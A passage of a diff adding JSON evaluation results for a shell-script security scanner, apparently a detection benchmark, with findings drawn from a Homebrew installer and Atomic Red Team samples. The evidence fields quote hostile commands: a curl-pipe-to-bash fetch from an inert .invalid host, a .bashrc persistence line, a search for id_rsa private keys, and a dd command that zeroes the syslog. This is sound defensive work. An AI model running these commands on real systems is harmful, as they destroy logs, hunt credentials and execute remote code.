+          "evidence": "execute_sudo \"${CHGRP[@]}\" \"${GROUP}\" \"${mkdirs[@]}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${MKDIR[@]}\" \"${HOMEBREW_REPOSITORY}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHOWN[@]}\" \"-R\" \"${USER}:${GROUP}\" \"${HOMEBREW_REPOSITORY}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHMOD[@]}\" \"g+rwx\" \"${HOMEBREW_CACHE}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHOWN[@]}\" \"-R\" \"${USER}\" \"${HOMEBREW_CACHE}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHGRP[@]}\" \"-R\" \"${GROUP}\" \"${HOMEBREW_CACHE}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${TOUCH[@]}\" \"${clt_placeholder}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"/usr/sbin/softwareupdate\" \"-i\" \"${clt_label}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"/usr/bin/xcode-select\" \"--switch\" \"/Library/Developer/CommandLineTools\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"/bin/rm\" \"-f\" \"${clt_placeholder}\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"/usr/bin/xcode-select\" \"--switch\" \"/Library/Developer/CommandLineTools\""
+        },
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "retry 5 \"${USABLE_GIT}\" \"fetch\" \"${quiet_progress[@]}\" \"--force\" \"origin\""
+        },
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "retry 5 \"${USABLE_GIT}\" \"fetch\" \"${quiet_progress[@]}\" \"--force\" \"--tags\" \"origin\""
+        },
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "retry 5 \"${USABLE_GIT}\" \"fetch\" \"--force\" \"${quiet_progress[@]}\" \\ \"origin\" \"refs/heads/main:refs/remotes/origin/main\""
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${MKDIR[@]}\" /etc/paths.d"
+        },
+        {
+          "ruleId": "system.sensitive-config",
+          "category": "system_modification",
+          "evidence": "execute_sudo tee /etc/paths.d/homebrew"
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo tee /etc/paths.d/homebrew"
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHOWN[@]}\" root:wheel /etc/paths.d/homebrew"
+        },
+        {
+          "ruleId": "privilege.sudo",
+          "category": "privilege_escalation",
+          "evidence": "execute_sudo \"${CHMOD[@]}\" \"a+r\" /etc/paths.d/homebrew"
+        }
+      ],
+      "truePositives": [
+        "interpreter_escape",
+        "network_egress",
+        "privilege_escalation",
+        "system_modification"
+      ],
+      "falsePositives": [],
+      "falseNegatives": [],
+      "missingExpectedFindings": [],
+      "findingCount": 32,
+      "parseErrorCount": 1,
+      "maximumParseErrors": 1,
+      "durationMilliseconds": 97.885978,
+      "passed": true
+    },
+    {
+      "id": "public-atomic-pipe-to-shell-001",
+      "split": "validation",
+      "language": "bash",
+      "kind": "malicious",
+      "sourceFile": "public/atomic-red-team/pipe-to-shell.sh.txt",
+      "sha256": "20a129c11f003e8c1c0a264800d71c05996999e8c41a54ab855d271d191dfaa9",
+      "provenance": {
+        "type": "public-derived",
+        "repository": "redcanaryco/atomic-red-team",
+        "commit": "1ba1dd8d9ce6f74700f7aec2e60de5632f667f03",
+        "sourceUrl": "https://github.com/redcanaryco/atomic-red-team/blob/1ba1dd8d9ce6f74700f7aec2e60de5632f667f03/atomics/T1059.004/T1059.004.yaml",
+        "upstreamSha256": "27b52dd93ed8b71af08d45a1c06561dece3ad4463b457cea9ff071c0605a784e",
+        "upstreamId": "fca246a8-a585-4f28-a2df-6495973976a1",
+        "license": "MIT",
+        "transformation": "Replaced the remote_url placeholder with an inert .invalid URL."
+      },
+      "expectedCategories": [
+        "download_execution",
+        "network_egress"
+      ],
+      "actualCategories": [
+        "download_execution",
+        "network_egress"
+      ],
+      "actualFindings": [
+        {
+          "ruleId": "network.tool",
+          "category": "network_egress",
+          "evidence": "curl -s https://artifacts.invalid/pipe-to-shell.sh"
+        },
+        {
+          "ruleId": "chain.download-execute",
+          "category": "download_execution",
+          "evidence": "curl -s https://artifacts.invalid/pipe-to-shell.sh | bash … curl -s https://artifacts.invalid/pipe-to-shell.sh | bash"
+        }
+      ],
+      "truePositives": [
+        "download_execution",
+        "network_egress"
+      ],
+      "falsePositives": [],
+      "falseNegatives": [],
+      "missingExpectedFindings": [],
+      "findingCount": 2,
+      "parseErrorCount": 0,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 1.3601840000000038,
+      "passed": true
+    },
+    {
+      "id": "public-atomic-bashrc-001",
+      "split": "validation",
+      "language": "bash",
+      "kind": "malicious",
+      "sourceFile": "public/atomic-red-team/bashrc-persistence.sh.txt",
+      "sha256": "0dbdc220294c0042cbafa8cd601ab00c3cd4448a8d32c39cd15a4785e708457d",
+      "provenance": {
+        "type": "public-derived",
+        "repository": "redcanaryco/atomic-red-team",
+        "commit": "1ba1dd8d9ce6f74700f7aec2e60de5632f667f03",
+        "sourceUrl": "https://github.com/redcanaryco/atomic-red-team/blob/1ba1dd8d9ce6f74700f7aec2e60de5632f667f03/atomics/T1546.004/T1546.004.yaml",
+        "upstreamSha256": "f709ed6ed473f2c368e3e949b0804d4ef06473938b68e029982d63bac57c0e45",
+        "upstreamId": "0a898315-4cfa-4007-bafe-33a4646d115f",
+        "license": "MIT",
+        "transformation": "Substituted the command_to_add placeholder with its inert default marker command."
+      },
+      "expectedCategories": [
+        "persistence"
+      ],
+      "actualCategories": [
+        "persistence"
+      ],
+      "actualFindings": [
+        {
+          "ruleId": "persistence.shell-rc",
+          "category": "persistence",
+          "evidence": "echo 'echo \"Atomic test marker\" > /tmp/T1546.004' >> ~/.bashrc"
+        }
+      ],
+      "truePositives": [
+        "persistence"
+      ],
+      "falsePositives": [],
+      "falseNegatives": [],
+      "missingExpectedFindings": [],
+      "findingCount": 1,
+      "parseErrorCount": 0,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.20779899999996587,
+      "passed": true
+    },
+    {
+      "id": "public-atomic-private-key-001",
+      "split": "validation",
+      "language": "bash",
+      "kind": "malicious",
+      "sourceFile": "public/atomic-red-team/discover-private-keys.sh.txt",
+      "sha256": "3f1ab94bb90d8397a496553a22b46a1bb524bac5607d2759c290a48e6a0b8976",
+      "provenance": {
+        "type": "public-derived",
+        "repository": "redcanaryco/atomic-red-team",
+        "commit": "1ba1dd8d9ce6f74700f7aec2e60de5632f667f03",
+        "sourceUrl": "https://github.com/redcanaryco/atomic-red-team/blob/1ba1dd8d9ce6f74700f7aec2e60de5632f667f03/atomics/T1552.004/T1552.004.yaml",
+        "upstreamSha256": "2da3cda17f05315b08fee9d3d7430a953f8eaa7a8d989accafb397b4e0934ba0",
+        "upstreamId": "46959285-906d-40fa-9437-5a439accd878",
+        "license": "MIT",
+        "transformation": "Substituted search_path and output_file placeholders with upstream defaults."
+      },
+      "expectedCategories": [
+        "credential_access"
+      ],
+      "actualCategories": [
+        "credential_access"
+      ],
+      "actualFindings": [
+        {
+          "ruleId": "credential.sensitive-path",
+          "category": "credential_access",
+          "evidence": "find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt"
+        }
+      ],
+      "truePositives": [
+        "credential_access"
+      ],
+      "falsePositives": [],
+      "falseNegatives": [],
+      "missingExpectedFindings": [],
+      "findingCount": 1,
+      "parseErrorCount": 0,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.3272119999999745,
+      "passed": true
+    },
+    {
+      "id": "public-atomic-overwrite-log-001",
+      "split": "validation",
+      "language": "bash",
+      "kind": "malicious",
+      "sourceFile": "public/atomic-red-team/overwrite-log.sh.txt",
+      "sha256": "e83013254f017a5ce5cb2bb37833e6a3c8328f7bf47a71ad2abbb3c39e43bb82",
+      "provenance": {
+        "type": "public-derived",
+        "repository": "redcanaryco/atomic-red-team",
+        "commit": "1ba1dd8d9ce6f74700f7aec2e60de5632f667f03",
+        "sourceUrl": "https://github.com/redcanaryco/atomic-red-team/blob/1ba1dd8d9ce6f74700f7aec2e60de5632f667f03/atomics/T1485/T1485.yaml",
+        "upstreamSha256": "dec58f0061250f6573532a24b952809a5feb21494dc36fb8a22002a4020cd005",
+        "upstreamId": "38deee99-fd65-4031-bec8-bfa4f9f26146",
+        "license": "MIT",
+        "transformation": "Substituted overwrite_source and file_to_overwrite placeholders with upstream defaults."
+      },
+      "expectedCategories": [
+        "defense_evasion",
+        "destructive_behavior"
+      ],
+      "actualCategories": [
+        "defense_evasion",
+        "destructive_behavior"
+      ],
+      "actualFindings": [
+        {
+          "ruleId": "defense.logs",
+          "category": "defense_evasion",
+          "evidence": "dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes"
+        },
+        {
+          "ruleId": "destructive.disk-write",
+          "category": "destructive_behavior",
+          "evidence": "dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes"
+        }
+      ],
+      "truePositives": [
+        "defense_evasion",
+        "destructive_behavior"
+      ],
+      "falsePositives": [],
+      "falseNegatives": [],
+      "missingExpectedFindings": [],
+      "findingCount": 2,
+      "parseErrorCount": 0,
+      "maximumParseErrors": 0,
+      "durationMilliseconds": 0.4123210000000199,
       "passed": true
     }
   ]
